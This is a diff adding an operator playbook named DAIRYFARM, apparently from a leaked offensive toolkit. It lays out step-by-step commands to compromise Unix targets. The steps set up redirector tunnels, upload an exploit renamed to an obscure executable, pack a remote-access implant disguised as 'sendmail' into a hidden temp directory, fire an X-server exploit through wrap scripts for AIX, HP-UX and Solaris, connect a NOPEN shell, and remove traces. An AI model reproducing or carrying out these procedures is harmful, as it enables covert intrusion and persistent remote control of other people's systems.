@@ -1,0 +1,96 @@
+###################################################################
+### DAIRYFARM
+###################################################################
+# Wed Mar 16 11:41:42 EDT 2011
+
+
+
+DAIRYFARM procedures:
+
+
+mx
+:%s/TARGET_IP/TARGET_IP/g
+:%s/WINDOWS_REDIR_IP/WINDOWS_REDIR_IP/g
+:%s/LINUX_OP_BOX_IP/192.168.254.71/g
+:%s/WINDOWS_OP_BOX_IP/192.168.254.72/g
+:%s/CONTROL_PORT/CONTROL_PORT/g
+:%s/XSERVER_PORT/XSERVER_PORT/g
+:%s/NETCAT_PORT/NETCAT_PORT/g
+:%s/NOPEN_PORT/NOPEN_PORT/g
+:%s/RAT_NAME/sendmail/g
+:%s,TMP_DIR,/tmp/.scsi,g
+`x
+
+### Follow steps in this order:
+
+
+### 1) on linux box, start dairyfarm client:
+
+#./df_client 35535 127.0.0.1:40211
+#./df_client CONTROL-PORT 127.0.0.1:XSERVER-PORT
+./df_client CONTROL_PORT 127.0.0.1:XSERVER_PORT
+
+### 2) on windows redir, set up tunnels:
+
+### the next line replaces the normal tunnel to call back to the xserver port 
+### and references the df control port instead
+#background redirect -tcp -implantlisten 35535 -target 192.168.254.131 35535 -nodes 40
+#background redirect -tcp -implantlisten CONTROL-PORT -target LINUX-OP-BOX CONTROL-PORT -nodes 40
+background redirect -tcp -implantlisten CONTROL_PORT -target LINUX_OP_BOX_IP CONTROL_PORT -nodes 40
+
+### to udp 177
+#background redirect -udp -lplisten 177 -target 61.555.227.115 177 -maxpacketsize 32000
+#background redirect -udp -lplisten 177 -target TARGET-IP 177 -maxpacketsize 32000
+background redirect -udp -lplisten 177 -target TARGET_IP 177 -maxpacketsize 32000
+
+### callback for netcat upload
+#background redirect -tcp -implantlisten 33881 -target 192.168.254.131 33881 -nodes 40
+#background redirect -tcp -implantlisten NETCAT-PORT -target LINUX-OPS-BOX NETCAT-PORT -nodes 40
+background redirect -tcp -implantlisten NETCAT_PORT -target LINUX_OP_BOX_IP NETCAT_PORT -nodes 40
+
+### callforward to nopen
+#background redirect -tcp -lplisten 32754 -target 61.555.227.115 32754
+#background redirect -tcp -lplisten NOPEN-PORT -target UNIX-TARGET-IP NOPEN-PORT
+background redirect -tcp -lplisten NOPEN_PORT -target TARGET_IP NOPEN_PORT -bind WINDOWS_OP_BOX_IP
+
+
+### 3) on windows redir, upload dairyfarm.exe as something obscure (help16.exe) and start:
+
+#background run -command "help16.exe 40211 127.0.0.1:35535"
+#background run -command "help16.exe XSERVER-PORT 127.0.0.1:CONTROL-PORT"
+background run -command "help16.exe XSERVER_PORT 127.0.0.1:CONTROL_PORT"
+
+
+### 4) on linux, set up to launch YS, using appropriate wrap script:
+
+cd /current/up
+file noserver
+# cp appropriate noserver from morerats to /current/up
+# Need to noprep it? Different listener port (default is 32754)
+#noprep noserver -lNOPEN_PORT
+noprep noserver -lNOPEN_PORT
+#packrat sendmail noserver.new 33881
+#packrat RAT_NAME noserver.new NETCAT-PORT
+packrat RAT_NAME /current/up/noserver.new NETCAT_PORT
+
+#./wrap-aix.sh -l 61.555.227.110 -r sendmail -p 33881 -x 40211 -d /tmp/.scsi
+#./wrap-hpux.sh -l 61.555.227.110 -r sendmail -p 33881 -x 40211 -d /tmp/.scsi
+#./wrap-sun.sh -l WIN-TARGET-IP -r RAT_NAME -p NETCAT-PORT -x XSERVER-PORT -d TMP_DIR
+./wrap-sun.sh -l WINDOWS_REDIR_IP -r RAT_NAME -p NETCAT_PORT -x XSERVER_PORT -d TMP_DIR
+
+#./xc -x 61.555.227.110 -y 40211 -s 61.555.227.110 192.168.254.72
+#./xc -x WIN-TARGET-IP -y XSERVER-PORT -s WIN-TARGET-IP WINDOWS-OP-BOX
+./xc -x WINDOWS_REDIR_IP -y XSERVER_PORT -s WINDOWS_REDIR_IP WINDOWS_OP_BOX_IP
+
+
+### 5) connect to nopen AFTER you control-c the netcat window:
+
+#noclient 192.168.254.72:32754
+noclient WINDOWS_OP_BOX_IP:NOPEN_PORT
+
+### 6) on linux, control-C the df_client window
+
+### 7) on windows, the dairyfarm.exe (renamed as help16.exe or whatever) should
+###    go away from the process listing;  You can now remove it from the target.
+
+
